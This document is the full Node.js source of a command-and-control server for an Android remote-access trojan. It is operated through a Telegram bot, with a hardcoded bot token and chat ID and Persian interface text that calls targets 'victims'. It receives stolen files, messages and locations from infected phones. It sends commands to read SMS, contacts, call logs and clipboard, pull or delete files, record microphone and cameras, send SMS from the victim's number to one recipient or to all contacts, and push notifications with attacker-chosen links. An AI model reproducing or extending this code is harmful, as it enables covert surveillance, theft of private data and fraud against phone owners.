const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = 
  '8179600784:AAGSDKOO1esilMAXtwqDPHSsAYhcWiwKm-A'
const id = '7517428729'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">ربات توسعه دهنده ربات با موفقیت راه اندازی شد:مهیار</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• پیامی از<b>${req.headers.model}</b> دستگاه`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• پیامی از<b>${req.headers.model}</b> دستگاه\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• موقعیت مکانی از <b>${req.headers.model}</b> دستگاه`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• دستگاه جدید متصل شد\n\n` +
        `• مدل دستگاه : <b>${model}</b>\n` +
        `• باتری : <b>${battery}</b>\n` +
        `• سیستم اندروید : <b>${version}</b>\n` +
        `• سطوح صفحه نمایش : <b>${brightness}</b>\n` +
        `• ارائه دهنده : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• دستگاه جدید متصل شد\n\n` +
            `• مدل دستگاه : <b>${model}</b>\n` +
            `• باتری : <b>${battery}</b>\n` +
            `• سیستم اندروید : <b>${version}</b>\n` +
            `• سطوح صفحه نمایش : <b>${brightness}</b>\n` +
            `• ارائه دهنده : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• لطفا شماره ای را که می خواهید از روی شماره قربانی بنویسید')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• خوب حالا پیامی را که می خواهید از دستگاه قربانی بفرستید به شماره ای که چند لحظه پیش نوشتید بنویسید ....\n\n' +
                '• مراقب باشید اگر تعداد کاراکترهای پیام شما بیشتر از تعداد مجاز باشد، پیام ارسال نشود،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• خوب حالا پیامی را که می خواهید از دستگاه قربانی بفرستید به شماره ای که چند لحظه پیش نوشتید بنویسید ....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• لطفا پیامی را که می خواهید برای همه ارسال کنید بنویسید')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '°•در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• لطفا پیامی را که می خواهید برای همه ارسال کنید بنویسید')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مسیر فایل مورد نظر خود را وارد کنید ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمانی که می خواهید صدای قربانی را ضبط کنید را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمانی را که می خواهید دوربین جلو ضبط کند را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمانی را که می خواهید دوربین سلفی قربانی ضبط کند را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• • در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیامی را که می خواهید در دستگاه قربانی نمایش داده شود وارد کنید')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیامی را که می خواهید به عنوان اعلان نمایش داده شود وارد کنید')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• عالی، حالا لینکی را که می خواهید با اعلان باز کنید وارد کنید\n\n' +
                '• وقتی قربانی روی اعلان کلیک می کند، لینکی که وارد می کنید باز می شود ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• عالی، حالا لینکی را که می خواهید با اعلان باز کنید وارد کنید')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیوند صوتی مورد نظر برای پخش را وارد کنید')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• به ربات توسعه دهنده هک ربات خوش آمدید مهیار\n\n' +
                '• اگر برنامه روی دستگاه مورد نظر نصب شده است، منتظر اتصال باشید\n\n' +
                '• هنگامی که پیام اتصال را دریافت می کنید به این معنی است که دستگاه مورد نظر متصل و آماده دریافت فرمان است\n\n' +
                '• بر روی دکمه فرمان کلیک کنید و دستگاه مورد نظر را انتخاب کنید و سپس دستور مورد نظر را بین دستور انتخاب کنید\n\n' +
                '• اگر در جایی از ربات گیر کرده اید، دستور /start را ارسال کنید ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["برای دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'دستگاه های متصل') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• هیچ دستگاهی متصل و در دسترس نیست\n\n' +
                    '• اطمینان حاصل کنید که برنامه بر روی دستگاه مورد نظر نصب شده است'
                )
            } else {
                let text = '°•📲 لیست دستگاه های متصل :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• مدل دستگاه : <b>${value.model}</b>\n` +
                        `• باتری : <b>${value.battery}</b>\n` +
                        `• سیستم اندروید : <b>${value.version}</b>\n` +
                        `• سطوح صفحه نمایش : <b>${value.brightness}</b>\n` +
                        `• ارائه دهنده : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'اجرای دستور') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• هیچ دستگاهی متصل و در دسترس نیست\n\n' +
                    '• اطمینان حاصل کنید که برنامه بر روی دستگاه مورد نظر نصب شده است'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• دستگاهی را که می خواهید دستورات را روی آن اجرا کنید انتخاب کنید', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• درخواست مجوز رد شد')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• انتخاب دستگاه هک شد🤖 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📲برنامه ها', callback_data: `apps:${uuid}`},
                        {text: '📄اطلاعات دستگاه', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📁دریافت فایل ها', callback_data: `file:${uuid}`},
                        {text: '🗂حذف فایل ها', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📃کلیپ بورد', callback_data: `clipboard:${uuid}`},
                        {text: '🔊میکروفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📸دوربین جلو', callback_data: `camera_main:${uuid}`},
                        {text: '📷دوربین سلفی', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'سایت💥', callback_data: `location:${uuid}`},
                        {text: '✉️ارسال پیام به تارگت', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '☎️تماس گرفتن', callback_data: `calls:${uuid}`},
                        {text: '💾کل مخاطبین', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳لرزش گوشی', callback_data: `vibrate:${uuid}`},
                        {text: '💬پیام علان ها', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '📩پیام ها', callback_data: `messages:${uuid}`},
                        {text: '📇ارسال یک پیام', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🔔پخش اهنگ', callback_data: `play_audio:${uuid}`},
                        {text: '🔕قط اهنگ', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '📲ارسال پیام به کل مخاطبین',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است، لطفا صبر کنید........\n\n' +
            '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد مهیار ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• لطفا شماره ای را که می خواهید از روی شماره قربانی بنویسید\n\n' +
            '• اگر می خواهید به شماره های کشور محلی پیامک ارسال کنید، می توانید شماره را با صفر در ابتدا وارد کنید، در غیر این صورت شماره را با کد کشور وارد کنید.',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• لطفا پیامی را که می خواهید برای همه ارسال کنید بنویسید\n\n' +
            '• مراقب باشید اگر تعداد کاراکترهای پیام شما بیشتر از تعداد مجاز باشد، پیام ارسال نشود ،',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مسیر فایلی را که می خواهید از دستگاه قربانی استخراج کنید وارد کنید\n\n' +
            '• نیازی نیست مسیر فایل کامل را وارد کنید، فقط مسیر اصلی را وارد کنید. برای مثال وارد کنید<b> DCIM/Camera </b> برای دریافت فایل های گالری.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مسیر فایل مورد نظر خود را وارد کنید \n\n' +
            '• نیازی نیست مسیر فایل کامل را وارد کنید، فقط مسیر اصلی را وارد کنید. برای مثال وارد کنید<b> DCIM/Camera </b> برای حذف فایل های گالری.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مسیر فایل مورد نظر خود را وارد کنید \n\n' +
            '• توجه داشته باشید که زمان باید به صورت عددی بر حسب واحد ثانیه وارد شود ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• پیامی را که می خواهید در دستگاه قربانی نمایش داده شود وارد کنید\n\n' +
            '• این یک پیام کوتاه است که برای چند ثانیه روی صفحه نمایش دستگاه ظاهر می شود ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• پیامی را که می خواهید به عنوان اعلان نمایش داده شود وارد کنید\n\n' +
            '• پیام شما مانند یک اعلان معمولی در نوار وضعیت دستگاه مورد نظر ظاهر می شود ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• °• پیوند صوتی مورد نظر برای پخش را وارد کنید\n\n' +
            '• توجه داشته باشید که باید لینک مستقیم صدای مورد نظر را وارد کنید در غیر این صورت صدا پخش نمی شود ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
